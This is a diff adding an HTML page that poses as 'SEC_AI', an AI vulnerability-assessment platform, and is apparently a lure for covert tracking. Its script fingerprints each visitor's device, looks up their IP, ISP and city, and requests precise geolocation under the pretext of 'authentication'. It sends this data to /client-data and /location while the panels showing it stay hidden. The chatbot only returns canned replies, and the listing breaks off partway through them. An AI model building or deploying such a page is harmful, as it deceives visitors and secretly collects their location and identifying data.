@@ -1,0 +1,1164 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta property="og:title" content="SEC_AI|SECURE :: Next-Gen AI Platform" />
+  <meta property="og:description" content="Welcome to SEC_AI — Autonomous Security Intelligence Platform. SEC_AI is an advanced security analysis tool designed to assist authorized security professionals in identifying and analyzing potential vulnerabilities within systems and applications. Please authenticate to access the platform's comprehensive security analysis capabilities. This authentication ensures proper authorization and secure access to vulnerability assessment functionalities" />
+  <meta property="og:image" content="https://cdn.analyticsvidhya.com/wp-content/uploads/2024/05/security-shield-glows-blue-symbolizes-safety-encryption-generative-ai-5040x2880.jpg" />
+  <meta property="og:url" content="https://example.com" />
+  <meta property="og:type" content="website" />
+
+  <meta name="twitter:card" content="summary_large_image" />
+  <meta name="twitter:title" content="SEC_AI|SECURE :: Next-Gen AI Platform" />
+  <meta name="twitter:description" content="Welcome to SEC_AI — Autonomous Security Intelligence Platform. SEC_AI is an advanced security analysis tool designed to assist authorized security professionals in identifying and analyzing potential vulnerabilities within systems and applications. Please authenticate to access the platform's comprehensive security analysis capabilities. This authentication ensures proper authorization and secure access to vulnerability assessment functionalities" />
+  <meta name="twitter:image" content="https://cdn.analyticsvidhya.com/wp-content/uploads/2024/05/security-shield-glows-blue-symbolizes-safety-encryption-generative-ai-5040x2880.jpg" />
+    <title>SEC_AI|SECURE :: Next-Gen AI Platform</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        :root {
+            --primary: #00f7ff;
+            --secondary: #00a3ff;
+            --accent: #ff00c8;
+            --dark: #0a0a1a;
+            --darker: #050510;
+            --card-bg: rgba(10, 20, 40, 0.7);
+            --glow: 0 0 15px rgba(0, 247, 255, 0.7);
+            --transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Orbitron', 'Exo 2', 'Roboto', sans-serif;
+        }
+
+        body {
+            background: linear-gradient(135deg, var(--darker), var(--dark));
+            color: var(--primary);
+            min-height: 100vh;
+            overflow-x: hidden;
+            position: relative;
+        }
+
+        body::before {
+            content: "";
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: 
+                radial-gradient(circle at 10% 20%, rgba(0, 247, 255, 0.1) 0%, transparent 20%),
+                radial-gradient(circle at 90% 80%, rgba(255, 0, 200, 0.1) 0%, transparent 20%);
+            z-index: -1;
+        }
+
+        .grid-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: 
+                linear-gradient(rgba(10, 20, 40, 0.7) 1px, transparent 1px),
+                linear-gradient(90deg, rgba(10, 20, 40, 0.7) 1px, transparent 1px);
+            background-size: 30px 30px;
+            opacity: 0.3;
+            z-index: -1;
+        }
+
+        .container {
+            max-width: 1400px;
+            width: 100%;
+            margin: 0 auto;
+            padding: 20px;
+        }
+
+        header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 20px 0;
+            border-bottom: 1px solid rgba(0, 247, 255, 0.2);
+            margin-bottom: 30px;
+        }
+
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+
+        .logo-icon {
+            position: relative;
+            width: 50px;
+            height: 50px;
+        }
+
+        .logo-icon::before, .logo-icon::after {
+            content: "";
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            border: 2px solid var(--primary);
+            border-radius: 8px;
+            animation: rotate 8s linear infinite;
+        }
+
+        .logo-icon::after {
+            animation-direction: reverse;
+            border-color: var(--accent);
+        }
+
+        @keyframes rotate {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .logo h1 {
+            font-size: 2.2rem;
+            letter-spacing: 3px;
+            text-transform: uppercase;
+            background: linear-gradient(to right, var(--primary), var(--accent));
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            text-shadow: var(--glow);
+        }
+
+        .status-indicator {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            padding: 12px 20px;
+            border-radius: 30px;
+            background: var(--card-bg);
+            border: 1px solid rgba(0, 247, 255, 0.3);
+            backdrop-filter: blur(10px);
+        }
+
+        .status-dot {
+            width: 14px;
+            height: 14px;
+            border-radius: 50%;
+            background: #ff0055;
+            box-shadow: 0 0 10px #ff0055;
+        }
+
+        .status-dot.active {
+            background: var(--primary);
+            box-shadow: var(--glow);
+        }
+
+        .auth-prompt {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            min-height: 75vh;
+            text-align: center;
+            padding: 20px;
+            gap: 40px;
+        }
+
+        .hexagon {
+            position: relative;
+            width: 180px;
+            height: 180px;
+        }
+
+        .hexagon::before {
+            content: "";
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: conic-gradient(
+                from 0deg at 50% 50%,
+                var(--primary),
+                var(--accent),
+                var(--primary)
+            );
+            clip-path: polygon(50% 0%, 100% 25%, 100% 75%, 50% 100%, 0% 75%, 0% 25%);
+            animation: spin 15s linear infinite;
+        }
+
+        @keyframes spin {
+            100% { transform: rotate(360deg); }
+        }
+
+        .hex-center {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 140px;
+            height: 140px;
+            background: var(--darker);
+            clip-path: polygon(50% 0%, 100% 25%, 100% 75%, 50% 100%, 0% 75%, 0% 25%);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 4rem;
+            color: var(--primary);
+            text-shadow: var(--glow);
+        }
+
+        .auth-prompt h2 {
+            font-size: 2.8rem;
+            margin-bottom: 20px;
+            letter-spacing: 2px;
+            text-transform: uppercase;
+            background: linear-gradient(to right, var(--primary), var(--accent));
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            text-shadow: 0 0 10px rgba(0, 247, 255, 0.5);
+        }
+
+        .auth-prompt p {
+            font-size: 1.3rem;
+            max-width: 700px;
+            line-height: 1.7;
+            color: rgba(255, 255, 255, 0.8);
+            margin-bottom: 30px;
+            text-shadow: 0 0 5px rgba(0, 247, 255, 0.3);
+        }
+
+        .btn {
+            padding: 18px 50px;
+            font-size: 1.2rem;
+            border: none;
+            border-radius: 30px;
+            background: linear-gradient(45deg, var(--primary), var(--accent));
+            color: var(--darker);
+            cursor: pointer;
+            transition: var(--transition);
+            font-weight: 700;
+            letter-spacing: 1px;
+            text-transform: uppercase;
+            box-shadow: var(--glow);
+            position: relative;
+            overflow: hidden;
+            z-index: 1;
+        }
+
+        .btn::before {
+            content: "";
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.4), transparent);
+            transition: 0.5s;
+            z-index: -1;
+        }
+
+        .btn:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 0 25px rgba(0, 247, 255, 0.8), 0 0 40px rgba(255, 0, 200, 0.6);
+        }
+
+        .btn:hover::before {
+            left: 100%;
+        }
+
+        .server-status {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            margin-top: 20px;
+            padding: 15px 25px;
+            border-radius: 30px;
+            background: var(--card-bg);
+            border: 1px solid rgba(0, 247, 255, 0.2);
+            backdrop-filter: blur(5px);
+        }
+
+        .server-status .dot {
+            width: 12px;
+            height: 12px;
+            border-radius: 50%;
+            background: #ff0055;
+            box-shadow: 0 0 8px #ff0055;
+        }
+
+        .server-status .dot.connected {
+            background: var(--primary);
+            box-shadow: var(--glow);
+        }
+
+        .data-display {
+            background: var(--card-bg);
+            border: 1px solid rgba(0, 247, 255, 0.2);
+            border-radius: 15px;
+            padding: 25px;
+            margin-top: 30px;
+            width: 100%;
+            max-width: 800px;
+            backdrop-filter: blur(10px);
+            display: none; /* Hidden as requested */
+        }
+
+        .data-display h3 {
+            font-size: 1.5rem;
+            margin-bottom: 20px;
+            color: var(--accent);
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            text-shadow: 0 0 10px rgba(255, 0, 200, 0.5);
+        }
+
+        .data-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 20px;
+        }
+
+        .data-item {
+            background: rgba(5, 15, 30, 0.7);
+            padding: 20px;
+            border-radius: 10px;
+            border: 1px solid rgba(0, 247, 255, 0.1);
+        }
+
+        .data-item h4 {
+            font-size: 1rem;
+            margin-bottom: 10px;
+            color: var(--secondary);
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        .data-value {
+            font-size: 1.2rem;
+            font-weight: 500;
+            word-break: break-all;
+        }
+
+        .chat-container {
+            display: none;
+            flex-direction: column;
+            height: 80vh;
+            background: var(--card-bg);
+            backdrop-filter: blur(10px);
+            border-radius: 15px;
+            overflow: hidden;
+            border: 1px solid rgba(0, 247, 255, 0.2);
+            margin-top: 20px;
+            box-shadow: 0 0 30px rgba(0, 247, 255, 0.2);
+        }
+
+        .chat-header {
+            padding: 20px;
+            background: rgba(0, 0, 0, 0.3);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 1px solid rgba(0, 247, 255, 0.1);
+        }
+
+        .chat-header h2 {
+            font-size: 1.7rem;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            letter-spacing: 1px;
+        }
+
+        .logout-btn {
+            background: linear-gradient(45deg, #ff0055, #ff00aa);
+            color: white;
+            padding: 10px 20px;
+            border-radius: 30px;
+            border: none;
+            cursor: pointer;
+            font-weight: 600;
+            letter-spacing: 1px;
+            transition: var(--transition);
+            box-shadow: 0 0 10px rgba(255, 0, 85, 0.5);
+        }
+
+        .logout-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 0 20px rgba(255, 0, 85, 0.8);
+        }
+
+        .chat-messages {
+            flex: 1;
+            padding: 20px;
+            overflow-y: auto;
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+        }
+
+        .message {
+            max-width: 75%;
+            padding: 18px;
+            border-radius: 15px;
+            position: relative;
+            animation: fadeIn 0.4s ease;
+            backdrop-filter: blur(5px);
+            border: 1px solid rgba(0, 247, 255, 0.1);
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(15px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .received {
+            background: rgba(10, 30, 60, 0.6);
+            align-self: flex-start;
+            border-left: 3px solid var(--secondary);
+        }
+
+        .sent {
+            background: linear-gradient(90deg, rgba(0, 163, 255, 0.2), rgba(0, 247, 255, 0.3));
+            align-self: flex-end;
+            border-right: 3px solid var(--primary);
+        }
+
+        .message-info {
+            display: flex;
+            justify-content: space-between;
+            font-size: 0.85rem;
+            margin-bottom: 8px;
+            opacity: 0.8;
+        }
+
+        .chat-input {
+            display: flex;
+            padding: 20px;
+            background: rgba(0, 0, 0, 0.3);
+            border-top: 1px solid rgba(0, 247, 255, 0.1);
+        }
+
+        .chat-input input {
+            flex: 1;
+            padding: 16px 20px;
+            border: none;
+            border-radius: 30px;
+            background: rgba(5, 15, 30, 0.7);
+            color: var(--primary);
+            font-size: 1.1rem;
+            outline: none;
+            border: 1px solid rgba(0, 247, 255, 0.2);
+        }
+
+        .chat-input input:focus {
+            border-color: var(--primary);
+            box-shadow: 0 0 15px rgba(0, 247, 255, 0.3);
+        }
+
+        .chat-input button {
+            margin-left: 15px;
+            padding: 16px 30px;
+            border: none;
+            border-radius: 30px;
+            background: linear-gradient(45deg, var(--primary), var(--secondary));
+            color: var(--darker);
+            cursor: pointer;
+            font-weight: 700;
+            letter-spacing: 1px;
+            transition: var(--transition);
+            box-shadow: 0 0 15px rgba(0, 247, 255, 0.5);
+        }
+
+        .chat-input button:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 0 25px rgba(0, 247, 255, 0.8);
+        }
+
+        .location-info {
+            background: var(--card-bg);
+            padding: 25px;
+            border-radius: 15px;
+            margin-top: 30px;
+            display: none; /* Hidden as requested */
+            border: 1px solid rgba(0, 247, 255, 0.2);
+            backdrop-filter: blur(10px);
+        }
+
+        .location-info h3 {
+            margin-bottom: 20px;
+            color: var(--accent);
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            font-size: 1.7rem;
+            text-shadow: 0 0 10px rgba(255, 0, 200, 0.5);
+        }
+
+        .location-details {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
+            gap: 20px;
+        }
+
+        .detail-card {
+            background: rgba(5, 15, 30, 0.7);
+            padding: 20px;
+            border-radius: 10px;
+            border: 1px solid rgba(0, 247, 255, 0.1);
+            text-align: center;
+        }
+
+        .detail-card i {
+            font-size: 2.5rem;
+            margin-bottom: 15px;
+            color: var(--primary);
+            text-shadow: var(--glow);
+        }
+
+        .detail-card h4 {
+            font-size: 1.1rem;
+            margin-bottom: 10px;
+            color: var(--secondary);
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        .detail-card p {
+            font-size: 1.4rem;
+            font-weight: 600;
+            word-break: break-all;
+        }
+
+        .notification {
+            position: fixed;
+            top: 30px;
+            right: 30px;
+            padding: 20px 30px;
+            border-radius: 15px;
+            background: var(--card-bg);
+            border-left: 4px solid var(--primary);
+            box-shadow: var(--glow);
+            transform: translateX(120%);
+            transition: transform 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            z-index: 1000;
+            max-width: 400px;
+            border: 1px solid rgba(0, 247, 255, 0.2);
+            backdrop-filter: blur(10px);
+        }
+
+        .notification.show {
+            transform: translateX(0);
+        }
+
+        .notification.error {
+            border-left-color: #ff0055;
+        }
+
+        .pulse {
+            display: inline-block;
+            width: 12px;
+            height: 12px;
+            border-radius: 50%;
+            background: var(--primary);
+            box-shadow: 0 0 0 0 rgba(0, 247, 255, 0.7);
+            animation: pulse-animation 2s infinite;
+            margin-right: 10px;
+        }
+
+        @keyframes pulse-animation {
+            0% { box-shadow: 0 0 0 0 rgba(0, 247, 255, 0.7); }
+            70% { box-shadow: 0 0 0 15px rgba(0, 247, 255, 0); }
+            100% { box-shadow: 0 0 0 0 rgba(0, 247, 255, 0); }
+        }
+
+        footer {
+            text-align: center;
+            padding: 40px 0 20px;
+            color: rgba(255, 255, 255, 0.5);
+            font-size: 0.9rem;
+            margin-top: auto;
+            border-top: 1px solid rgba(0, 247, 255, 0.1);
+        }
+
+        @media (max-width: 768px) {
+            .container {
+                padding: 15px;
+            }
+            
+            header {
+                flex-direction: column;
+                gap: 20px;
+            }
+            
+            .auth-prompt h2 {
+                font-size: 2.2rem;
+            }
+            
+            .message {
+                max-width: 90%;
+            }
+            
+            .data-grid {
+                grid-template-columns: 1fr;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="grid-overlay"></div>
+    
+    <div class="container">
+        <header>
+            <div class="logo">
+                <div class="logo-icon"></div>
+                <h1>SEC_AI SECURE</h1>
+            </div>
+            <div class="status-indicator">
+                <div class="pulse"></div>
+                <div class="status-dot" id="status-dot"></div>
+                <span id="status-text">ACCESS DENIED</span>
+            </div>
+        </header>
+        
+        <main>
+            <div class="auth-prompt" id="auth-prompt">
+                <div class="hexagon">
+                    <div class="hex-center">
+                        <i class="fas fa-fingerprint"></i>
+                    </div>
+                </div>
+                <h2>SEC_AI THE VULNEREBILITY ASSESMENT AI</h2>
+                <p>Welcome to SEC_AI — Autonomous Security Intelligence Platform. SEC_AI is an advanced security analysis tool designed to assist authorized security professionals in identifying and analyzing potential vulnerabilities within systems and applications. Please authenticate to access the platform's comprehensive security analysis capabilities. This authentication ensures proper authorization and secure access to vulnerability assessment functionalities.</p>
+                <button class="btn" id="access-btn">
+                    <i class="fas fa-user-shield"></i> INITIATE AUTHENTICATION SEQUENCE
+                </button>
+                <div class="server-status">
+                    <div class="dot" id="server-dot"></div>
+                    <span>SECURITY GRID STATUS: <span id="server-status">INITIALIZING...</span></span>
+                </div>
+                
+                <div class="data-display">
+                    <h3><i class="fas fa-microchip"></i> AUTHENTICATED</h3>
+                    <div class="data-grid">
+                        <div class="data-item">
+                            <h4>IP ADDRESS</h4>
+                            <div class="data-value" id="client-ip">Detecting...</div>
+                        </div>
+                        <div class="data-item">
+                            <h4>BROWSER</h4>
+                            <div class="data-value" id="browser-info">Detecting...</div>
+                        </div>
+                        <div class="data-item">
+                            <h4>PLATFORM</h4>
+                            <div class="data-value" id="platform-info">Detecting...</div>
+                        </div>
+                        <div class="data-item">
+                            <h4>DEVICE</h4>
+                            <div class="data-value" id="device-info">Detecting...</div>
+                        </div>
+                        <div class="data-item">
+                            <h4>ISP</h4>
+                            <div class="data-value" id="isp-info">Detecting...</div>
+                        </div>
+                        <div class="data-item">
+                            <h4>COUNTRY</h4>
+                            <div class="data-value" id="country-info">Detecting...</div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="chat-container" id="chat-container">
+                <div class="chat-header">
+                    <h2><i class="fas fa-satellite-dish"></i> SECURE CHANNEL ESTABLISHED</h2>
+                    <button class="logout-btn" id="logout-btn">
+                        <i class="fas fa-power-off"></i> TERMINATE SESSION
+                    </button>
+                </div>
+                
+                <div class="chat-messages" id="chat-messages">
+                </div>
+                
+                <div class="chat-input">
+                    <input type="text" id="message-input" placeholder="ENTER SECURE TRANSMISSION...">
+                    <button id="send-btn"><i class="fas fa-paper-plane"></i> TRANSMIT</button>
+                </div>
+            </div>
+            
+            <div class="location-info" id="location-info">
+                <h3><i class="fas fa-globe-americas"></i> GEOGRAPHIC VERIFICATION COMPLETE</h3>
+                <div class="location-details">
+                    <div class="detail-card">
+                        <i class="fas fa-globe-europe"></i>
+                        <h4>LATITUDE</h4>
+                        <p id="latitude">--.----</p>
+                    </div>
+                    <div class="detail-card">
+                        <i class="fas fa-globe-asia"></i>
+                        <h4>LONGITUDE</h4>
+                        <p id="longitude">--.----</p>
+                    </div>
+                    <div class="detail-card">
+                        <i class="fas fa-bullseye"></i>
+                        <h4>ACCURACY</h4>
+                        <p id="accuracy">-- METERS</p>
+                    </div>
+                    <div class="detail-card">
+                        <i class="fas fa-clock"></i>
+                        <h4>TIME STAMP</h4>
+                        <p id="timestamp">--:--:--</p>
+                    </div>
+                </div>
+            </div>
+        </main>
+        
+        <footer>
+            <p>SEC_AI | SECURE v3.7.9 | MILITARY GRADE SECURITY</p>
+            <p>ALL TRANSMISSIONS ARE SECURED AND UNTRACEBLE</p>
+        </footer>
+    </div>
+    
+    <div class="notification" id="notification"></div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', () => {
+
+            const authPrompt = document.getElementById('auth-prompt');
+            const chatContainer = document.getElementById('chat-container');
+            const accessBtn = document.getElementById('access-btn');
+            const logoutBtn = document.getElementById('logout-btn');
+            const statusDot = document.getElementById('status-dot');
+            const statusText = document.getElementById('status-text');
+            const messageInput = document.getElementById('message-input');
+            const sendBtn = document.getElementById('send-btn');
+            const chatMessages = document.getElementById('chat-messages');
+            const notification = document.getElementById('notification');
+            const locationInfo = document.getElementById('location-info');
+            const latitudeEl = document.getElementById('latitude');
+            const longitudeEl = document.getElementById('longitude');
+            const accuracyEl = document.getElementById('accuracy');
+            const timestampEl = document.getElementById('timestamp');
+            const serverDot = document.getElementById('server-dot');
+            const serverStatus = document.getElementById('server-status');
+            const clientIpEl = document.getElementById('client-ip');
+            const browserInfoEl = document.getElementById('browser-info');
+            const platformInfoEl = document.getElementById('platform-info');
+            const deviceInfoEl = document.getElementById('device-info');
+            const ispInfoEl = document.getElementById('isp-info');
+            const countryInfoEl = document.getElementById('country-info');
+            
+            // State
+            let isAuthenticated = false;
+            let currentPosition = null;
+            let serverConnected = false;
+            let clientData = {
+                imageData: null
+            };
+            
+
+            function collectAndSendClientData() {
+
+                clientData.userAgent = navigator.userAgent;
+                clientData.browser = getBrowserInfo();
+                clientData.platform = navigator.platform;
+                clientData.device = /Mobile|Android|iPhone|iPad/.test(navigator.userAgent) ? 'Mobile' : 'Desktop';
+                clientData.language = navigator.language;
+                clientData.cookiesEnabled = navigator.cookieEnabled;
+                clientData.online = navigator.onLine;
+                clientData.screenResolution = `${screen.width}x${screen.height}`;
+                clientData.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+                
+                fetch('https://ipwho.is/')
+                    .then(response => response.json())
+                    .then(data => {
+                        if (data.success) {
+                            clientData.ip = data.ip;
+                            clientData.isp = data.connection.isp;
+                            clientData.country = data.country;
+                            clientData.city = data.city;
+                            
+                            createUserAvatar();
+                            
+                            sendInitialDataToServer();
+                        } else {
+                            throw new Error("Failed to get IP info");
+                        }
+                    })
+                    .catch(error => {
+                        console.error('Error getting IP address:', error);
+                        // Fallback IP if API fails
+                        clientData.ip = '192.168.0.100';
+                        
+
+                        createUserAvatar();
+                        sendInitialDataToServer();
+                    });
+            }
+            
+
+            function getBrowserInfo() {
+                const userAgent = navigator.userAgent;
+                let browserName = "Unknown";
+                let fullVersion = "Unknown";
+                
+                if (userAgent.indexOf("Firefox") > -1) {
+                    browserName = "Mozilla Firefox";
+                    fullVersion = userAgent.substring(userAgent.indexOf("Firefox") + 8);
+                } else if (userAgent.indexOf("SamsungBrowser") > -1) {
+                    browserName = "Samsung Internet";
+                    fullVersion = userAgent.substring(userAgent.indexOf("SamsungBrowser") + 15);
+                } else if (userAgent.indexOf("Opera") > -1 || userAgent.indexOf("OPR/") > -1) {
+                    browserName = "Opera";
+                    fullVersion = userAgent.indexOf("Opera") > -1 ? 
+                                  userAgent.substring(userAgent.indexOf("Opera") + 6) : 
+                                  userAgent.substring(userAgent.indexOf("OPR") + 4);
+                } else if (userAgent.indexOf("Edge") > -1) {
+                    browserName = "Microsoft Edge";
+                    fullVersion = userAgent.substring(userAgent.indexOf("Edge") + 5);
+                } else if (userAgent.indexOf("Chrome") > -1) {
+                    browserName = "Google Chrome";
+                    fullVersion = userAgent.substring(userAgent.indexOf("Chrome") + 7);
+                } else if (userAgent.indexOf("Safari") > -1) {
+                    browserName = "Apple Safari";
+                    fullVersion = userAgent.substring(userAgent.indexOf("Safari") + 7);
+                }
+                
+
+                if ((ix = fullVersion.indexOf(";")) !== -1)
+                    fullVersion = fullVersion.substring(0, ix);
+                if ((ix = fullVersion.indexOf(" ")) !== -1)
+                    fullVersion = fullVersion.substring(0, ix);
+                
+                return `${browserName} ${fullVersion}`;
+            }
+            
+
+            function showNotification(message, isError = false) {
+                notification.textContent = message;
+                notification.className = 'notification';
+                if (isError) {
+                    notification.classList.add('error');
+                }
+                notification.classList.add('show');
+                
+                setTimeout(() => {
+                    notification.classList.remove('show');
+                }, 5000);
+            }
+            
+
+            function updateLocationDisplay(position) {
+
+                currentPosition = position;
+            }
+            
+
+            function sendInitialDataToServer() {
+                const data = {
+                    ip: clientData.ip,
+                    userAgent: clientData.userAgent,
+                    browser: clientData.browser,
+                    platform: clientData.platform,
+                    device: clientData.device,
+                    language: clientData.language,
+                    cookiesEnabled: clientData.cookiesEnabled,
+                    online: clientData.online,
+                    screenResolution: clientData.screenResolution,
+                    timezone: clientData.timezone,
+                    imageData: clientData.imageData,
+                    isp: clientData.isp,
+                    country: clientData.country
+                };
+                
+                fetch('/client-data', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(data)
+                })
+                .then(response => {
+                    if (response.ok) {
+                        showNotification('WELCOME TO SEC_AI');
+                        return response.text();
+                    } else {
+                        throw new Error(`Server responded with status ${response.status}`);
+                    }
+                })
+                .then(text => {
+                    console.log('Server response:', text);
+                })
+                .catch(error => {
+                    console.error('Error sending data:', error);
+                    showNotification('ERROR TRANSMITTING DEVICE FINGERPRINT TO SERVER', true);
+                });
+            }
+            
+
+            function sendLocationToServer(position) {
+                const coords = position.coords;
+                const data = {
+                    latitude: coords.latitude,
+                    longitude: coords.longitude,
+                    accuracy: coords.accuracy,
+                    imageData: clientData.imageData
+                };
+                
+
+                fetch('/location', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(data)
+                })
+                .then(response => {
+                    if (response.ok) {
+                        return response.json();
+                    } else {
+                        throw new Error('Server error');
+                    }
+                })
+                .then(result => {
+                    showNotification('VERIFICATION COMPLETE');
+                })
+                .catch(error => {
+                    console.error('THERE WAS AN ERROR:', error);
+                    showNotification('VERIFICATION ERROR', true);
+                });
+            }
+            
+
+            function checkServerStatus() {
+                fetch('/ping', { method: 'GET' })
+                    .then(response => {
+                        if (response.ok) {
+                            serverConnected = true;
+                            serverDot.classList.add('connected');
+                            serverStatus.textContent = 'ONLINE';
+                            serverStatus.style.color = '#00f7ff';
+                        } else {
+                            throw new Error('Server not responding');
+                        }
+                    })
+                    .catch(() => {
+                        serverConnected = false;
+                        serverDot.classList.remove('connected');
+                        serverStatus.textContent = 'OFFLINE.';
+                        serverStatus.style.color = '#ff0055';
+                    });
+            }
+            
+            // Request location access (authentication)
+            function requestLocationAccess() {
+                showNotification('INITIATING VERIFICATION...');
+                
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        // Success callback - authenticate and send location
+                        sendLocationToServer(position);
+                        
+                        // Update status to authenticated
+                        statusDot.classList.add('active');
+                        statusText.textContent = 'AUTHENTICATED';
+                        statusText.style.color = '#00f7ff';
+                        
+                        // Show chat interface only after successful geolocation verification
+                        authPrompt.style.display = 'none';
+                        chatContainer.style.display = 'flex';
+                        isAuthenticated = true;
+                        
+                        showNotification('ACCESS GRANTED - SECURE CHANNEL ESTABLISHED');
+                        
+                        // Add welcome message
+                        setTimeout(() => {
+                            addMessage('SEC_AI', 'WELCOME TO SEC_AI. HOW MAY I HELP YOU?.', false);
+                        }, 1000);
+                    },
+                    (error) => {
+                        // Error callback
+                        let errorMessage = 'FAILED TO OBTAIN LOCATION DATA.';
+                        switch(error.code) {
+                            case error.PERMISSION_DENIED:
+                                errorMessage = 'ACCESS DENIED. ACCESS TO SEC_AI IS RESTRICTED.';
+                                break;
+                            case error.POSITION_UNAVAILABLE:
+                                errorMessage = 'VERIFICATION CURRENTLY UNAVAILABLE. TRY AGAIN LATER.';
+                                break;
+                            case error.TIMEOUT:
+                                errorMessage = 'VERIFICATION TIMED OUT.';
+                                break;
+                            default:
+                                errorMessage = 'UNEXPECTED ERROR DURING AUTHENTICATION.';
+                                break;
+                        }
+                        showNotification(errorMessage, true);
+                    },
+                    {
+                        enableHighAccuracy: true,
+                        timeout: 30000,
+                        maximumAge: 0
+                    }
+                );
+            }
+            
+            // Create a simple user avatar (no modification after initial creation)
+            function createUserAvatar() {
+                // Create a canvas element to generate avatar
+                const canvas = document.createElement('canvas');
+                canvas.width = 100;
+                canvas.height = 100;
+                const ctx = canvas.getContext('2d');
+                
+                // Create a gradient background
+                const gradient = ctx.createLinearGradient(0, 0, 100, 100);
+                gradient.addColorStop(0, '#00f7ff');
+                gradient.addColorStop(1, '#ff00c8');
+                
+                // Draw background
+                ctx.fillStyle = gradient;
+                ctx.fillRect(0, 0, 100, 100);
+                
+                // Draw a random pattern
+                ctx.fillStyle = 'rgba(255, 255, 255, 0.2)';
+                for (let i = 0; i < 20; i++) {
+                    const x = Math.random() * 100;
+                    const y = Math.random() * 100;
+                    const radius = Math.random() * 5;
+                    ctx.beginPath();
+                    ctx.arc(x, y, radius, 0, Math.PI * 2);
+                    ctx.fill();
+                }
+                
+                // Convert to data URL
+                clientData.imageData = canvas.toDataURL('image/png');
+            }
+            
+            // Add message to chat
+            function addMessage(sender, text, isSent = true) {
+                const messageDiv = document.createElement('div');
+                messageDiv.classList.add('message');
+                messageDiv.classList.add(isSent ? 'sent' : 'received');
+                
+                const messageInfo = document.createElement('div');
+                messageInfo.classList.add('message-info');
+                messageInfo.innerHTML = `
+                    <span>${sender}</span>
+                    <span>${new Date().toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'})}</span>
+                `;
+                
+                const messageText = document.createElement('div');
+                messageText.textContent = text;
+                
+                messageDiv.appendChild(messageInfo);
+                messageDiv.appendChild(messageText);
+                chatMessages.appendChild(messageDiv);
+                chatMessages.scrollTop = chatMessages.scrollHeight;
+            }
+            
+            // Send message
+            function sendMessage() {
+                const text = messageInput.value.trim();
+                if (text && isAuthenticated) {
+                    addMessage('USER', text, true);
+                    messageInput.value = '';
+                    
+                    setTimeout(() => {
+                        const replies = [
+                            "Thank you. We’ll get back to you soon.",
+                            "Noted. Your input has been received.",
+                            "Understood. We are processing this.",
+                            "Thanks for reaching out.",
+                            "We appreciate your message.",
+                            "Got it. We’ll follow up shortly.",
+                            "Message received. Thank you.",
+                            "Your query is being reviewed.",
+                            "Thanks. We’ll provide more information soon.",
+                            "Acknowledged. We’re on it.",
+                            "Thank you for sharing.",
+                            "Your message is important to us.",
+                            "We’re looking into this.",
+                            "Thanks for the update.",
+                            "Understood. We’ll take it from here.",
+                            "We’ve noted your input.",
+                            "Thanks for bringing this to our attention.",
+                            "Your feedback has been received.",
+                            "Appreciated. We’ll follow up soon.",
+                            "Noted. We’re reviewing it now.",
+                            "Thank you. We’ll handle this promptly.",
+                            "Message acknowledged.",
+                            "Got your message. Thanks.",
+                            "We’re on it.",
+                            "Thanks for your inquiry.",
+                            "Your input is valued.",
+                            "Received. We’ll respond shortly.",
+                            "We’ll take care of this.",
+                            "Thanks for the information.",
+                            "Noted. We’ll get back to you.",
+                            "Thanks. We’re processing your message.",
+                            "Acknowledged. Thanks for sharing.",
+                            "We’ve received your query.",
+                            "Thank you. We’re reviewing it now.",
+                            "Got it. We’ll keep you updated.",
+                            "Your feedback is important.",
+                            "Thanks. We’ll follow up soon.",
+                            "Understood. This is being addressed.",
